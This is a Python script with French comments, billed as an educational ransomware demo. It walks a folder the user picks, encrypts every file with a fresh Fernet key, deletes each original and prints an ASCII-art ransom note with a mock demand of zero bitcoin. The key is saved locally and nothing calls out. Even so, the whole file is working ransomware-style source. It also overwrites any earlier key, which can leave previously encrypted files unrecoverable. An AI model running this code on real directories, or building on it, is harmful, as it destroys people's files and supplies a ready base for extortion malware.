import os
from cryptography.fernet import Fernet

# === Étape 1 : Générer une clé AES symétrique ===
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

# === Étape 2 : Charger la clé existante ===
def load_key():
    with open("key.key", "rb") as key_file:
        return key_file.read()

# === Étape 3 : Chiffrer un fichier texte ===
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(file_path + ".enc", "wb") as encrypted_file:
        encrypted_file.write(encrypted)
    os.remove(file_path)

# === Étape 4 : Parcourir les fichiers d'un dossier ===
def encrypt_folder(folder_path, fernet):
    for root, dirs, files in os.walk(folder_path):
        for filename in files:
            full_path = os.path.join(root, filename)
            if not filename.endswith(".enc") and filename != "key.key":
                print(f"[+] Chiffrement de : {full_path}")
                encrypt_file(full_path, fernet)

# === Étape 5 : Afficher une fausse note de rançon ===
def show_ransom_note():
    note = """
██████╗  █████╗ ███╗   ██╗███████╗███████╗███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔════╝██╔════╝
██████╔╝███████║██╔██╗ ██║█████╗  █████╗  ███████╗
██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██╔══╝  ╚════██║
██║     ██║  ██║██║ ╚████║███████╗███████╗███████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝

[!] Vos fichiers ont été chiffrés avec un algorithme AES 256 bits.
[!] Ne tentez pas de les restaurer sans la clé.

💸 Pour les récupérer, envoyez 0 BTC à notre wallet fictif.
🗝️ La clé est stockée dans le fichier key.key (ne la perdez pas).

(Projet éducatif. Aucun fichier n'a été exfiltré.)
"""
    print(note)

# === MAIN ===
if __name__ == "__main__":
    folder = input("Entrez le dossier à chiffrer (ex: test_folder/) : ")

    if not os.path.isdir(folder):
        print("[!] Dossier introuvable.")
        exit()

    # Génère ou charge la clé
    key = generate_key()
    fernet = Fernet(key)

    # Chiffre tous les fichiers
    encrypt_folder(folder, fernet)

    # Affiche la fausse rançon
    show_ransom_note()
 